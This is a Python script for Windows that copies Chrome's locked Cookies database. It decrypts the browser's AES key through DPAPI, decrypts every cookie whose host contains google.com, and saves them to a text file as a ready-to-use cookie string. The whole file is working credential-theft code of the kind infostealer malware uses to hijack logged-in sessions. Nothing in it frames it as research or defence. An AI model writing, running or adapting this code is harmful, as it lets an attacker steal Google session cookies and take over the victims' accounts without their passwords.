import os
import sqlite3
import subprocess
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_encryption_key():
    local_state_path = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AESGCM(key)
        return cipher.decrypt(iv, payload, None).decode('utf-8')
    except Exception as e:
        return ""

def main():
    cookie_file = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies')
    cookie_file = os.path.abspath(cookie_file)
    dst_file = os.path.abspath('cookies.db')
    
    # Use cmd copy to copy locked file
    subprocess.run(f'cmd /c copy /y "{cookie_file}" "{dst_file}"', shell=True)
    
    key = get_encryption_key()
    
    conn = sqlite3.connect(dst_file)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%google.com%'")
    
    cookies = {}
    for host, name, enc_val in cursor.fetchall():
        val = decrypt_data(enc_val, key)
        if val:
            cookies[name] = val
            
    print(f"Decrypted {len(cookies)} Google cookies!")
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    with open('google_cookies.txt', 'w', encoding='utf-8') as f:
        f.write(cookie_str)

if __name__ == '__main__':
    main()
